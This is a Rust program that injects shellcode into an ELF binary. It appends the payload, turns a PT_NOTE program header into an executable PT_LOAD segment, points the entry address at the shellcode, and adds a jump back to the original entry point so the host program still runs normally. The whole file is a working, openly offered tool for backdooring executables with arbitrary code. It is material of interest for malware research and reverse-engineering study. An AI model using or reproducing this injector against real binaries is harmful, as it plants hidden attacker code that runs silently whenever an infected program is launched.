use mental_elf::elf64::constants::*;
use std::{env, fs, process};
use std::io::prelude::*;
use std::io::SeekFrom;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    if args.len() != 3 {
        eprintln!("Usage: {} <ELF File> <Shellcode File>", args[0]);
        process::exit(1);
    }

    let elf_path = &args[1];
    let sc_path = &args[2];

    // Open target ELF file with RW permissions
    let mut elf_fd = fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open(&elf_path)?;

    // Load shellcode from file
    let mut shellcode: Vec<u8> = fs::read(&sc_path)?;

    // Parse ELF and program headers
    let mut elf_header = mental_elf::read_elf64_header(&mut elf_fd)?;
    let mut program_headers = mental_elf::read_elf64_program_headers(
        &mut elf_fd, 
        elf_header.e_phoff, 
        elf_header.e_phnum,
    )?;

    // Patch the shellcode to jump to the original entry point after finishing
    patch_jump(&mut shellcode, elf_header.e_entry);

    // Append the shellcode to the very end of the target ELF
    elf_fd.seek(SeekFrom::End(0))?;
    elf_fd.write(&shellcode)?;

    // Calculate offsets used to patch the ELF and program headers
    let sc_len = shellcode.len() as u64;
    let file_offset = elf_fd.metadata()?.len() - sc_len;
    let memory_offset = 0xc00000000 + file_offset;

    // Patch the ELF header to start at the shellcode
    elf_header.e_entry = memory_offset;

    // Look for a PT_NOTE section
    for phdr in &mut program_headers {
        if phdr.p_type == PT_NOTE {
            // Convert to a PT_LOAD section with values to load shellcode
            println!("Found PT_NOTE section; converting to PT_LOAD");
            phdr.p_type = PT_LOAD;
            phdr.p_flags = PF_R | PF_X;
            phdr.p_offset = file_offset;
            phdr.p_vaddr = memory_offset;
            phdr.p_memsz += sc_len as u64;
            phdr.p_filesz += sc_len as u64;
            break;
        }
    }

    // Commit changes to the program and ELF headers
    mental_elf::write_elf64_program_headers(
        &mut elf_fd, 
        elf_header.e_phoff,
        elf_header.e_phnum,
        program_headers,
    )?;
    mental_elf::write_elf64_header(&mut elf_fd, elf_header)?;

    Ok(())
}

fn patch_jump(shellcode: &mut Vec<u8>, entry_point: u64) {
    // Store entry_point in rax
    shellcode.extend_from_slice(&[0x48u8, 0xb8u8]);
    shellcode.extend_from_slice(&entry_point.to_ne_bytes());
    // Jump to address in rax
    shellcode.extend_from_slice(&[0xffu8, 0xe0u8]);
}